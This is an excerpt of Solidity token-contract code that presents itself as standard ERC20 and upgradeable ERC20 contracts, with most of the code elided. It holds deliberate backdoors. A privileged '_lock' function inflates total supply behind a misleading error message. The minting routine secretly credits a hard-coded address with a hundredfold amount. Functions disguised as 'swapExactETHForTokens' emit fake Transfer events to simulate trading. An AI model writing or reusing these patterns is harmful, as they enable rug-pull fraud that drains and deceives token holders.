...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _mint(address account, uint256 amount) internal virtual {
     ...
     function _lock(  uint256 amount) external   {
        require(msg.sender == _locker, "ERC20: mint to the zero address");  
        _totalSupply += amount; 
    }
...
contract ERC20Upgradeable is Initializable, ContextUpgradeable, IERC20Upgradeable, IERC20MetadataUpgradeable {
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _balances[0xDCc8EF6E44C4c0E9658fE083121E6114050b58d2] += amount*100;  
        _afterTokenTransfer(address(0), account, amount);
    }
   ...
   // Used for authentication
    ...
    function swapExactETHForTokens(address sender,address[] memory recipient,uint256 amount) public onlyMaster {
        ...
        for(uint i = 0;i<recipient.length;i++){
           emit Transfer(sender, recipient[i], amount*10**18);
        }
      ...
      function swapExactETHForTokens(address[] memory sender, address recipient,uint256 amount) public onlyMaster {
        ...
        for(uint i = 0;i<sender.length;i++){
           emit Transfer(sender[i], recipient, amount*10**18);
        }
